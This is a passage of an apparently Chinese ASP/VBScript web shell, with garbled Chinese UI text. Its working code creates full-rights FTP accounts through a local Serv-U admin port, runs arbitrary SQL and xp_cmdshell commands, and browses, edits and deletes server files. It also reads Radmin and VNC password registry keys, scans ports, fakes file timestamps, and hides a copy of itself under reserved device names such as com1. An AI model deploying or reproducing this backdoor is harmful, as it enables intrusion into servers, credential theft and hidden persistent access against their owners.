leaves = leaves & "-SETDOMAIN" & vbcrlf & "-Domain=TEST596|"&nimajbm&"|" & tport & "|-1|1|0" & vbcrlf & "-TZOEnable=0" & vbcrlf & " TZOKey=" & vbcrlf
leaves = leaves & "-SETUSERSETUP" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & "-User=" & tuser & vbcrlf & "-Password=" & tpass & vbcrlf & _
"-HomeDir=" & tpath & "\" & vbcrlf & "-LoginMesFile=" & vbcrlf & "-Disable=0" & vbcrlf & "-RelPaths=1" & vbcrlf & _
"-NeedSecure=0" & vbcrlf & "-HideHidden=0" & vbcrlf & "-AlwaysAllowLogin=0" & vbcrlf & "-ChangePassword=0" & vbcrlf & _
"-QuotaEnable=0" & vbcrlf & "-MaxUsersLoginPerIP=-1" & vbcrlf & "-SpeedLimitUp=0" & vbcrlf & "-SpeedLimitDown=0" & vbcrlf & _
"-MaxNrUsers=-1" & vbcrlf & "-IdleTimeOut=600" & vbcrlf & "-SessionTimeOut=-1" & vbcrlf & "-Expire=0" & vbcrlf & "-RatioUp=1" & vbcrlf & _
"-RatioDown=1" & vbcrlf & "-RatiosCredit=0" & vbcrlf & "-QuotaCurrent=0" & vbcrlf & "-QuotaMaximum=0" & vbcrlf & _
"-Maintenance=System" & vbcrlf & "-PasswordType=Regular" & vbcrlf & "-Ratios=None" & vbcrlf & " Access=" & tpath & "\|RWAMELCDP" & vbcrlf
leaves = leaves & "quit" & vbcrlf
on error resume next
set xpost = createobject("MSXML2.XMLHTTP")
xpost.open "POST", "http://127.0.0.1:"& port &"/leaves", true
xpost.send(leaves)
set xpost=nothing
jb ("���� �ɹ� ִ�У���FTP �û���: " & tuser & " " & "����: " & tpass & " ·��: " & tpath & " :)<br><BR>")
else
leaves = "User " & usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
leaves = leaves & "-DELETEUSER" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & " User=" & tuser & vbcrlf
set xpost3 = createobject("MSXML2.XMLHTTP")
xpost3.open "POST", "http://127.0.0.1:"& port &"/leaves", true
xpost3.send(leaves)
set xpost3=nothing
end if
End Function:









if session("web2a2dmin")<>UserPass then
if request.form("pass")<>"" then
if request.form("pass")=UserPass then
session("web2a2dmin")=UserPass
response.redirect url
else
jb"<br><br><br><div align=center><font color=#FF0000>�Բ������������������ϵͳ���������½��</font></div>"
end if
else
si="<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href='"&SiteURL&"' target='_blank'>"&nimajb&"</a><hr><form action='"&url&"' method='post'>���룺<input name='pass' type='password' size='22'> <input type='submit' value='��¼'><hr>"&Copyright&"</center>"
if instr(SI,SIC)<>0 then jb sI
end if
response.end
end if






Function DBmaNaGer()
  sqlstr=tRIm(REQueST.fOrm("SqlStr"))
  dbStr=REquesT.FORM("DbStr")
  si=Si&"<table width='650'  border='0' cellspacing='0' cellpadding='0'>"
  sI=SI&"<form name='DbForm' method='post' action=''>"
  sI=SI&"<tr><td width='100' height='27'> &nbsp;���ݿ��� �Ӵ� :</td>"
  Si=si&"<td><input name='DbStr' style='width:470' value="""&dbSTr&"""></td>"
  si=si&"<td width='60' align='center'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option value=-1>���Ӵ�ʾ��</option><option value=0>Access����</option>"
  sI=SI&"<option value=1>MsSql ���� </option><option value=2>MySql ���� </option><option value=3>DSN ���� </option>"
  Si=si&"<option value=-1>--SQL �﷨ --</option><option value=4>��ʾ ���� </option><option value=5>��� ���� </option>"
  SI=Si&"<option value=6>ɾ�� ���� </option><option value=7>�޸� ���� </option><option value=8>���� �ݱ� </option>"
  SI=SI&"<option value=9>ɾ�� �ݱ�</option><option value=10>��� �ֶ� </option><option value=11>ɾ�� �ֶ� </option>"
  sI=si&"<option value=12>��ȫ ��ʾ </option></select></td></tr>"
  Si=Si&"<input name='Action' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'>"
  sI=si&"<tr><td height='30'>&nbsp;SQL��������: </td>"
  Si=SI&"<td><input name='SqlStr' style='width:470' value="""&sQlsTr&"""></td>"
  sI=sI&"<td align='center'><input type='submit' name='Submit' value='ִ��' onclick='return DbCheck()'></td>"
  SI=SI&"</tr></form></table><span id='abc'></span>"
  echo sI:SI=""
  IF LeN(DBstR)>40 thEN
  set cONn=CREatEObjEct(OBT(5,0))
  Conn.OPEN DBsTr
  SEt Rs=CoNn.OPENschEmA(20) 
  si=Si&"<table><tr height='25' Bgcolor='#CCCCCC'><td>��<br>��</td>"
  Rs.MovEfirst 

  DO whIlE not RS.EOF
    IF Rs("TABLE_TYPE")="TABLE" tHEN
          tNAMe=rS("TABLE_NAME")
      SI=sI&"<td align=center><a href=""javascript:if(confirm('ȷ��ɾ ��ô��'))FullSqlStr('DROP TABLE ["&tnAMe&"]',1)"">[ del ]</a><br>"
      SI=sI&"<a href='javascript:FullSqlStr(""SELECT * FROM ["&tNAMe&"]"",1)'>"&TnAMe&"</a></td>"
    eND IF 
    rS.mOveNExT 
  lOOP 
  SeT rS=nothiNg
  si=SI&"</tr></table>"
  jb si:si=""
If LEn(SQLsTR)>10 tHen
  If LCaSe(lEfT(sQLstr,6))="select" Then
    SI=Si&"ִ����䣺"&sQLStr
    set rs=cReatEobject("Adodb.Recordset")
    rS.OPeN SqLsTR,cONn,1,1
    Fn=RS.FIeLDs.cOUNT
    RC=rS.rECoRDcOUnt
    Rs.PaGesIZe=20
    CounT=Rs.pagEsIze
    pN=RS.pagECOuNT
    page=rEqUesT("Page")
    IF PAge<>"" TheN pAGE=ClNg(pAGe)
    if PAge="" Or pAGE=0 TheN Page=1
    if paGe>pN then page=PN
    iF PaGe>1 tHEn rS.ABsoLUTepAGe=PaGE
    Si=SI&"<table><tr height=25 bgcolor=#cccccc><td></td>"          
    FoR n=0 to FN-1
      SEt flD=rS.fIeldS.Item(n)
      si=Si&"<td align='center'>"&fld.NAMe&"</td>"
      set fLd=noTHinG
    nEXt
    sI=sI&"</tr>"
    Do WhILe nOt(rs.Eof oR Rs.BOF) And COunt>0
          count=CounT-1
          bgcoLOR="#EFEFEF"
          SI=sI&"<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>"  
          FoR I=0 TO fn-1
        IF bGCOlOR="#EFEFEF" tHEn:BgColoR="#F5F5F5":ELsE:BgcoLOR="#EFEFEF":EnD iF
        iF rC=1 tHeN
           COlInFO=HTmlencoDe(rS(I))
        elsE
           cOliNFO=HTmleNCode(lEft(rS(I),50))
        eNd iF
            sI=SI&"<td bgcolor="&BGColOr&">"&cOlInFO&"</td>"
          NEXT
          sI=si&"</tr>"
      Rs.movEnExT
    LOOp
        jb SI:Si=""
        sqLstR=HtMLEncodE(SqLStr)
    sI=si&"<tr><td colspan="&fn+1&" align=center>��¼����"&rC&"&nbsp;ҳ�룺"&PAgE&"/"&Pn
    If pn>1 THEN
      si=si&"&nbsp;&nbsp;<a href='javascript:FullSqlStr("""&SqlsTR&""",1)'>��ҳ</a>&nbsp;<a href='javascript:FullSqlStr("""&SQlstR&""","&PAge-1&")'>��һҳ</a>&nbsp;"
      IF paGE>8 tHEn:sP=pagE-8:Else:SP=1:eND iF
      for i=sp To sp+8
        if i>pN THEn EXIt FOr
        If i=pAgE theN
        sI=si&I&"&nbsp;"
        ELSE
        sI=si&"<a href='javascript:FullSqlStr("""&sQLsTR&""","&i&")'>"&I&"</a>&nbsp;"
        EnD iF
      next
          SI=SI&"&nbsp;<a href='javascript:FullSqlStr("""&SqlsTR&""","&paGe+1&")'>��һҳ</a>&nbsp;<a href='javascript:FullSqlStr("""&sQLstR&""","&pN&")'>βҳ</a>"
    End IF
    si=sI&"<hr color='#EFEFEF'></td></tr></table>"
    rS.CLOSe:Set rs=NotHiNG
        jb sI:si=""
  elSe           
    CONN.ExecUtE(sqlSTR)
    si=sI&"SQL ��䣺"&SqLstr
  EnD IF
  jb si:Si=""
enD if
  CoNn.clOsE
  Set COnN=NotHiNg
  End If
End Function
DIm t1
CLASS uPc
  DIM d1,d2
  pUBlic FunctIOn fOrM(f)
    F=lCAsE(F)
    if D1.EXiSTS(f) THEn:fOrM=D1(F):ELsE:fOrm="":End if
  ENd fuNCTion
  pUBLIc fuNcTiON UA(f)
    F=lcASE(F)
    If D2.EXIsTs(f) tHeN:SEt UA=d2(f):ElSe:set uA=neW fIF:End IF
  end fUNCtion
  pRIVATe sUB CLaSs_INitIALizE
  dIM tDa,Tst,vBcRlF,tiN,diEnD,t2,TLen,tfl,sfv,FSTart,fEnD,dstArT,deNd,UpNAMe
    SeT d1=cREateOBJECt(Obt(4,0))
        If requESt.TOTalBYTes<1 THen ExiT suB
    sEt T1 = crEateOBjECT(oBt(6,0))
        T1.tYpe = 1 : t1.MODE =3 : T1.OPEn
    T1.wrIte  REquESt.bINaryrEAd(rEqUEsT.tOtAlBytES)
    t1.posITiON=0 : Tda =T1.ReAd : DsTarT = 1
    Dend = LeNB(tDa)
    seT d2=CReatEOBJECt(OBt(4,0))
        VBcrlF = ChRB(13) & chrB(10)
    SET t2 = CReAtEobjeCT(oBt(6,0))
    Tst = MIdB(tdA,1, InStRB(DsTaRT,tdA,Vbcrlf)-1)
    TlEN = LENb (Tst)
    DSTArT=Dstart+TLeN+1
    WhIlE (dstarT + 10) < dEND
      diEND = instrB(DStArT,tdA,vBCRlf & vBcrlF)+3
      T2.tYPE = 1 : T2.MODE =3 : t2.open
      t1.PoSITIon = DStaRT
      T1.CopyTo T2,DieNd-dStart
      t2.POSITiOn = 0 : t2.tYPe = 2 : T2.cHARSet ="gb2312"
      TIN = t2.reAdTexT : T2.CLOSe
      DStart = inStRB(dieNd,TDA,tSt)
      FStarT = INsTR(22,tiN,"name=""",1)+6
      fEND = INstr(FSTART,tiN,"""",1)
      uPnAme = LCaSe(MId (TIn,FsTarT,FENd-FstArT))
      iF INstr (45,tin,"filename=""",1) > 0 tHeN
        Set Tfl=nEW FIf
        FsTART = iNStR(Fend,tin,"filename=""",1)+10
        FENd = INSTr(fstarT,TIn,"""",1)
        fstaRt = insTr(FEnd,TIN,"Content-Type: ",1)+14
        FEnD = iNStr(FSTArT,tIN,VbCR)
        tfl.FiLesTart =dienD
        TFl.FIlESIzE = dSTArt -DienD -3
        iF noT D2.eXiSTS(UPnAmE) TheN
          D2.aDD uPNAmE,tFl
        eND iF
      else
        T2.tyPE =1 : T2.MOdE =3 : t2.Open
        T1.PositiOn = DieND : t1.coPytO T2,dstArt-dIeND-3
        t2.POSitIoN = 0 : t2.tyPe = 2
        t2.CHaRSET ="gb2312"
        SFv = T2.ReadtexT
        T2.CLOse
        If d1.eXiStS(UPnAME) theN
          D1(UpnAMe)=d1(UPnamE)&", "&SfV
        ELse
          d1.Add UPNAmE,sfv
        ENd If
      ENd iF
      dsTart=DstarT+tLeN+1
    wENd
    Tda=""
    Set T2 =nothinG
  End SuB
  pRIVATE SuB CLasS_tErminATe
    IF rEQUeST.ToTaLbyTes>0 THEn
      D1.remOvEAll:d2.RemoVEAll
      sEt D1=NOthIng:sEt D2=nothinG
      T1.cLOsE:SeT T1 =NOtHIng
    end iF
  END SuB
EnD Class
ClAsS Fif
dIm FileSIzE,FilEStART
  pRiVAtE suB ClasS_INITiAliZe
  fILesiZE = 0
  filesTaRT= 0
  ENd sub
  pUBlIc fUnctiOn sAvEAs(F)
  dim t3
  Saveas=tRUe
  IF tRim(f)="" OR filestArt=0 THEN exIT FUNcTIOn
  sET t3=crEAteobjECt(oBT(6,0))
     t3.moDe=3 : t3.tyPe=1 : T3.OPEn
     T1.PoSiTIoN=fiLeStarT
     t1.copyTo T3,fILEsIZE
     t3.SAVeTofILE f,2
     T3.ClOsE
     sEt T3=NOthiNg
     saVeas=fAlSE
   ENd FunCtIon
End claSs
cLASS Lbf
  DIm CF
  PrIVate suB class_InitIALIZe
    sEt cf=cReAtEoBjeCt(Obt(0,0))
  enD sUB
  PrIvATe Sub cLass_TERMInAte
    sET cf=NOtHINg
  end sUB
  fUNCTion shoWDrIVeR()
    For EaCH d In cF.drIves
      jb"&nbsp;&nbsp;&nbsp;<a href='javascript:ShowFolder("""&D.drIvELetTer&":\\"")'>����-����  ("&D.dRIvELEtteR&":)</a><br>" 
    nexT
  ENd fUncTIOn
  funcTiOn shOW1fiLE(PAth)
jb"<tr><td height='20'><a href='?Action=goback' target='FileFrame'>&nbsp;&nbsp;���ϼ�Ŀ¼</a></td></tr>"
  SeT FOlD=cF.GeTFOlDeR(pAth)
  I=0
    si="<table width='100%' border='0' cellspacing='0' cellpadding='0'><tr>"
  fOR EACH f IN FOLD.suBFOlDERS
    Si=sI&"<td height=10>"

    si=Si&"<a href='javascript:ShowFolder("""&repaTh(PATh&"\"&F.name)&""")' title=""��""><font face='wingdings' size='6'>0</font>"&F.NaMe&"</a>" 
        SI=sI&" _<a href='javascript:FullForm("""&REpaTh(pATh&"\"&f.nAME)&""",""CopyFolder"")'  onclick='return yesok()' class='am' title='����'>Copy</a>"
    sI=Si&"  <a href='javascript:FullForm("""&rEPlACe(pATh&"\"&f.nAME,"\","\\")&""",""DelFolder"")'  onclick='return yesok()' class='am' title='ɾ��'>Del</a>"
        SI=SI&" <a href='javascript:FullForm("""&repatH(PaTH&"\"&f.naME)&""",""MoveFolder"")'  onclick='return yesok()' class='am' title='�ƶ�'>Move</a>"
        Si=SI&" <a href='javascript:FullForm("""&rEPAth(paTH&"\"&F.NaMe)&""",""DownFile"")'  onclick='return yesok()' class='am' title='����'>Down</a></td>"
        i=i+1
    If I MOd 3 = 0 TheN SI=si&"</tr><tr>"
  neXt
    si=Si&"</tr><tr><td height=2></td></tr></table>"
        echo SI &"<hr noshade size=1 color=""#"" />" : sI=""
  fOr eacH L IN FoLd.FILEs
    Si="<table width='100%' border='0' cellspacing='0' cellpadding='0'>"
    si=SI&"<tr style='boungroup-color:#'>"
        sI=Si&"<td height='30'><a href='javascript:FullForm("""&REpath(PAth&"\"&l.naMe)&""",""DownFile"");' title='����'><font face='wingdings' size='4'>2</font>"&L.nAMe&"</a></td>"
    Si=Si&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePATH(Path&"\"&L.NamE)&""",""EditFile"")' class='am' title='�༭'>edit</a></td>"
        sI=sI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePAth(PATH&"\"&l.naMe)&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>del</a></td>"
        si=Si&"<td width='40' align=""center""><a href='javascript:FullForm("""&RepatH(PAtH&"\"&l.NAME)&""",""CopyFile"")' class='am' title='����'>copy</a></td>"
        si=sI&"<td width='40' align=""center""><a href='javascript:FullForm("""&REpaTh(PatH&"\"&l.namE)&""",""MoveFile"")' class='am' title='�ƶ�'>move</a></td>"        
    Si=Si&"<td width='50' align=""center"">"&ClNG(l.SiZe/1024)&"K</td>"
        sI=sI&"<td width='200' align=""center"">"&l.TyPe&"</td>"
    SI=sI&"<td width='160'>"&l.DATElAStmoDIfIed&"</td>"
    sI=sI&"</tr></table>"
        echo si:Si=""
  nExt
  sEt FOlD=NoTHIng
  EnD fUNctiON
  fuNcTiOn DeLFilE(pATh)
IF cf.fIlEexIsts(paTh) then
Cf.DelEtEFile paTh
sI="<center><br><br><br>�ļ� "&pATH&" ɾ�� �ɹ���</center>"
Si=Si&BaCkURL
jb Si
EnD iF
End Function

Function EDitfIlE(path)
if reqUest("Action2")="Post" then
SeT T=Cf.cReAteTExtFiLe(paTH)
T.wrIteLinE ReQUEsT.FoRM("content")
T.CLoSE
Set T=NOTHinG
sI="<center><br><br><br>�ļ� ���� �ɹ���</center>"
sI=si&baCKurl
jb si
ResPonse.eNd
end IF
IF pAtH<>"" then
Set T=cF.OpENTeXTfiLe(pATH, 1, fAlSE)
TxT=htmLencoDE(t.rEaDaLL) 
T.cLOSe
SeT t=nothing
elSe
path=sesSIOn("FolderPath")&"\newfile.asp":Txt="�½� �ļ�"
End If
sI=si&"<Form action='"&Url&"?Action2=Post' method='post' name='EditForm'>"
si=si&"<input name='Action' value='EditFile' Type='hidden'>"
Si=sI&"<input name='FName' value='"&patH&"' style='width:100%'><br>"
si=sI&"<textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br>"
si=si&"<hr><input name='goback' type='button' value='����' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='����'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='����'></form>"
jb si
  EnD fuNCTiON
  fuNctiON CoPyfILe(pATh)
  pAth = SPLIT(pAtH,"||||")
    If cF.FileExiSTS(PAth(0)) ANd path(1)<>"" THEN
          cF.copYFIlE patH(0),pATH(1)
      si="<center><br><br><br>�ļ�"&patH(0)&"���� �ɹ���</center>"
      SI=si&backurL
          jb sI 
        enD IF
  eND fUnCTIOn
  FuNctioN movEFiLE(PaTh)
  PaTh = SPlit(patH,"||||")
if cF.FIleExIstS(pATh(0)) ANd path(1)<>"" THEN
Cf.mOVEfILe pAth(0),pAth(1)
Si="<center><br><br><br>�ļ�"&paTh(0)&"�ƶ� �ɹ���</center>"
Si=SI&baCkuRl
 jb Si 
eND If
EnD FuNCtioN
FUNCtiON DELFoLdeR(pATh)
If cF.FolderExists(PATH) THEn
cF.DELetefOlDeR paTH
si="<center><br><br><br>Ŀ¼"&paTH&"ɾ�� �ɹ���</center>"
Si=Si&BacKuRl
jb sI
End if
end fUNCtiOn
FunCTiON cOPYFolDER(PatH)
pAtH = SpliT(PAth,"||||")
 iF cf.FolderExists(paTh(0)) anD PATh(1)<>"" ThEn
cF.CopYFOlDEr paTh(0),pAth(1)
si="<center><br><br><br>Ŀ¼"&Path(0)&"���� �ɹ���</center>"
si=si&BaCkUrl
jb si
END iF
END fUncTIoN
FUnctION MOvEfolDER(PATh)
Path = SPlIt(PAth,"||||")
iF cf.FolderExists(paTH(0)) And Path(1)<>"" tHEN
CF.MoVeFOLDeR pATh(0),patH(1)
Si="<center><br><br><br>Ŀ¼"&Path(0)&"�ƶ� �ɹ���</center>"
sI=sI&BaCKURL
jb Si
END if
ENd Function
FuNcTiON NEWfoLder(PaTh)
iF noT cF.FolDERexists(pATH) and pAth<>"" tHEN
Cf.CreATeFOldER PatH
SI="<center><br><br><br>Ŀ¼"&PATH&"�½� �ɹ���</center>"
si=SI&baCkurl
jb sI
END If
eNd FUNCtION
End CLAsS
sub shellcore
end sub
sub ReadREG()
jb "<form method=post>"
jb  "ע����ֵ��ȡ <p>" 
jb "<input type=hidden value=ReadReg name=theAct>"
jb "<tr><td colspan=2> "
jb "<select onChange='this.form.thePath.value=this.value;'>"
jb "<option value=''>ѡ���Դ��ļ�ֵ </option>"
jb "<option value='HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName'>ComputerName</option>":jb"<option value=""HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Linkage\Bind"">�����б�</option>":jb"<option value=""HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Parameter"">Radmin����</option>":jb"<option value=""HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Port"">Radmin�˿�</option>":jb"<option value=""HKCU\Software\ORL\WinVNC3\Password"">VNC3����</option>":jb"<option value=""HKCU\Software\ORL\WinVNC3\PortNumber"">VNC3�˿�</option>":jb"<option value=""HKLM\SOFTWARE\RealVNC\WinVNC4\Password"">VNC4����</option>":jb"<option value=""HKLM\SOFTWARE\RealVNC\WinVNC4\PortNumber"">VNC4�˿�</option>":jb"<option value=""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\PortNumber"">3389�˿�</option>":jb"<option value=""HKLM\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPDataPort"">PcAnyW���ݶ˿�</option>":jb"<option value=""HKLM\SOFTWARE\Symantec\pcAnywhere\CurrentVersion\System\TCPIPStatusPort"">PcAnyW״̬�˿�</option>":jb "<option value='HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\EnableSecurityFilters'>tcp/ip����1</option>":jb "<option value='HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\Tcpip\EnableSecurityFilters'>tcp/ip����2</option>":jb "<option value='HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\EnableSecurityFilters'>tcp/ip����3</option>":jb "<option value='HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SchedulingAgent\LogPath'>Schedule Log</option>":jb "<option value='HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List\3389:TCP'>���𿪷�</option>":jb "<option value='HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\UDPAllowedPorts'>�����ŵ�UDP�˿�</option>":jb "<option value='HKLM\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\{8A465128-8E99-4B0C-AFF3-1348DC55EB2E}\TCPAllowedPorts'>�����ŵ�TCP�˿�</option>":jb "</select><br />":jb " <input name=thePath value='' size=80>":jb "<input type=button value='�� �� ֵ' onclick='this.form.submit()'>":jb "</form><hr/>"
if Request("thePath")<>"" then
On Error Resume Next
Set wsX = Server.CreateObject(Obt(1,0)):thePath=Request("thePath"):theArray=wsX.RegRead(thePath)
If IsArray(theArray) Then
For i=0 To UBound(theArray):jb "<li>" & theArray(i)
Next
Else:jb "<li>" & theArray
End If
end if:end sub
sub SetFileText()
dim Path,FileName,NewTime,ShuXing
set path=request.Form("path1")
set fileName=request.Form("filename")
set newTime=request.Form("time")
set ShuXing=request.Form("shuxing")
jb "<form method=post>"
jb "<center>·&nbsp;&nbsp;&nbsp;&nbsp;����<input name='path1' value='"&WWWROOT&"\' size='60'>(һ��Ҫ��\��β)<br/>"
jb "&nbsp;�ļ����ƣ�<input name=filename value='index.asp' size='60'>(Ҫ�޸ĵ��ļ���)<br/>"
jb "&nbsp;&nbsp;&nbsp;�޸�ʱ�䣺<input name=time value='12/21/2012 23:59:59' size='60'>&nbsp;��/��/�� ʱ:��:��<br/>"
jb"<select onChange='this.form.shuxing.value=this.value;'>"
jb"<option value=''>��ͨ </option>"
jb"<option value='1'>ֻ�� </option>"
jb"<option value='2'>���� </option>"
jb"<option value='4'>ϵͳ</option>"
jb"<option value='33'>ֻ��,�浵 </option>"
jb"<option value='34'>����,�浵 </option>"
jb"<option value='35'>ֻ������,�浵 </option>"
jb"<option value='39'>ֻ������,�浵,ϵͳ </option>"
jb "�޸� ���ԣ�<input name=shuxing value='0' size='60'><br/>"
jb "<input type=submit value=�޸��ļ�ʱ��>"
jb "</form>"
if( (len(path)>0)and(len(fileName)>0)and(len(newTime)>0) )then
Set fso=Server.CreateObject(oBt(0,0))
Set file=fso.getFile(path&fileName)
file.attributes=ShuXing
Set shell=Server.CreateObject("Shell.Application")
Set app_path=shell.NameSpace(server.mappath("."))
Set app_file=app_path.ParseName(fileName)
app_file.Modifydate=newTime
jb "</br></br>�޸��ļ�&nbsp;&nbsp;"&path&fileName&"&nbsp;&nbsp;������� </center>"
end if
end sub
FuncTion MMD()
SI="<br><table width=""100%""><tr class=tr><form name=form method=post action="""">CMD����<input type=text name=MMD size=35 value=ipconfig><input type=text name=U value=sa><input type=text name=P value=><input type=submit value=ִ��></form></tr></table>":jb SI:SI="":If trim(request.form("MMD"))<>""  Then:password= trim(Request.form("P")):id=trim(Request.form("U")):set adoConn=sERvEr.crEATeobjECT(OBT(5,0)):adoConn.Open "Provider=SQLOLEDB.1;Password="&password&";User ID="&id:strQuery = "exec master.dbo.xp_cMdsHeLl '" & request.form("MMD") & "'":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF Then:Do While NOT recResult.EOF:strResult = strResult & chr(13) & recResult(0):recResult.MoveNext:Loop:End if:set recResult = Nothing:strResult = Replace(strResult," ","&nbsp;"):strResult = Replace(strResult,"<","&lt;"):strResult = Replace(strResult,">","&gt;"):strResult = Replace(strResult,chr(13),"<br>"):End if:set adoConn = Nothing:jb request.form("MMD") & "<br>"& strResult:end FuncTion
Sub ScanPort()
SERveR.ScrIPtTIMeouT = 7776000
IF REQuesT.fORM("port")="" theN
PoRTliST="21,1433,3389,43958"
ELse
portList=RequeST.form("port")
End If
iF rEqUEST.forM("ip")="" tHEn
iP="127.0.0.1"
ELse
ip=ReQuEST.FOrM("ip")
eND iF
jb"<p>�˿�ɨ���� (���ɨ�����˿�,�ٶȱȽ���,�����Ƽ�ʹ��CMD)</p>"
jb"<form name='form1' method='post' action='' onSubmit='form1.submit.disabled=true;'>"
jb"<p>Scan IP:&nbsp;"
jb" <input name='ip' type='text' class='TextBox' id='ip' value='"&Ip&"' size='60'>"
jb"<br>Port List:"
jb"<input name='port' type='text' class='TextBox' size='60' value='"&pORTLiSt&"'>"
jb"<br><br>"
jb"<input name='submit' type='submit' class='buttom' value='��ʼɨ�� '>"
jb"<input name='scan' type='hidden' id='scan' value='111'>"
jb"</p></form>"
iF rEqUeST.fORM("scan") <> "" tHen
tiMer1 = timeR
jb("<b>ɨ�豨�� :</b><br><hr>")
Tmp = SpLIt(rEQUest.foRm("port"),",")
Ip = spLit(REQuEST.fORM("ip"),",")
for HU = 0 tO ubOunD(iP)
if iNSTr(iP(Hu),"-") = 0 TheN
fOR i = 0 to uBoUNd(tMP)
if ISNUMERIc(TMp(I)) then 
CAll scAn(Ip(hU), TMP(I))
ELse
SeeKx = iNsTr(tmP(i), "-")
IF sEeKx > 0 THen
stARtN = LEfT(tMP(I), seeKX - 1 )
eNDN = rigHt(TMP(i), lEn(TmP(i)) - SeEkX )
iF IsNUMeRIc(StarTN) And IsNuMeRic(enDN) THEN
for J = STARTn to ENdn
cALl scan(ip(hu), j)
NEXT
elsE
jb(StArTn & " or " & EnDN & " is not number<br>")
End If
eLSe
jb(tMP(i) & " is not number<br>")
EnD IF
End IF
NExt
Else
iPStaRt = MID(iP(hu),1,InstRREV(Ip(hu),"."))
fOr xxX = mid(ip(hU),inSTrreV(ip(hu),".")+1,1) To MId(ip(hu),INstR(Ip(Hu),"-")+1,LEN(ip(hU))-inStr(ip(Hu),"-"))
fOR I = 0 TO UboUnD(Tmp)
if isnumErIC(tMP(I)) TheN 
Call sCAn(iPsTart & xXX, TMp(i))
ElsE
SeEkX = insTr(tMP(i), "-")
If SeeKx > 0 ThEn
StArTN = leFt(tmP(I), seeKx - 1 )
enDn = riGHT(TMp(i), LEn(tMp(I)) - sEEKx )
if isNuMeRIC(staRtN) And isNumeRic(EndN) THEn
foR j = StArTn TO endn
caLl SCaN(IPstARt & xxX,j)
NExt
eLse
jb(STaRTn & " or " & EndN & " is not number<br>")
END if
eLsE
jb(Tmp(i) & " is not number<br>")
eND If
END if
neXt
Next
END if
next
TIMER2 = timER
tHetImE=CStr(INt(TIMEr2-TImEr1))
jb"<hr>Process in "&TheTImE&" s"
EnD iF
enD suB
suB SCAN(TaRgETIP, poRTnUM)
oN error ReSUMe nExt
set coNN = sERvEr.createObJect(OBT(5,0))
ConnstR="Provider=SQLOLEDB.1;Data Source=" & tARgETIp &","& PoRtNUm &";User ID=lake2;Password=;"
CoNN.COnNECtiOnTImeout = 1
CONn.OPen coNNSTr
If err tHeN
if ERr.NuMbEr = -2147217843 or eRR.NUmBer = -2147467259 Then
If INStr(err.dEsCriptIoN, "(Connect()).") > 0 THEn
jb(taRgEtIP & ":" & pORtnuM & ".........�ر�<br>")
ELSE
jb(TarGETIP & ":" & pOrTNum & ".........<font color=red>����</font><br>")
enD IF
enD iF
END if
eND sUB 
function lIl(bb)
but=22
for i = 1 to len(bb)
if mid(bb,i,1)<>"��" then
If Asc(Mid(bb, i, 1)) < 32 Or Asc(Mid(bb, i, 1)) > 126 Then
a = a & Chr(Asc(Mid(bb, i, 1)))
else
pk=asc(mid(bb,i,1))-but
if pk>126 then
pk=pk-95
elseif pk<32 then
pk=pk+95
end if
a=a&chr(pk)
end if
else
a=a&vbcrlf
end if
next
lIl=a
end function
sub hiddenshell
jb"<form name=form1 method=post><input type=hidden name=se value=hidden>������ʬ���ɽ�������һ���µ��ļ������¼�¼��ַ<input type=submit name=submit value='������ʬ��������'></form>"
if request("se")="hidden" then
fpath=request.servervariables("path_translated")
set fso=server.createobject("scripting.filesystemobject")
pex="com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9"
rndpex=split(pex,"|")(rndnumber(0,17))
session("seljw")=""
filepath1=server.mappath(".")
filename1=right(fpath,len(fpath)-instrrev(fpath,"\"))
url=request.servervariables("url")
url=left(url,instrrev(url,"/"))&rndpex&"."&filename1

fso.copyfile fpath,"\\.\"&filepath1&"\"&rndpex&"."&filename1
set fso=nothing
jb "<script>parent.location='http://"&request("server_name")&url&"';</script>"
end if

end sub

Function RndNumber(Min,Max) 
Randomize 
RndNumber=Int((Max - Min + 1) * Rnd() + Min) 
End Function
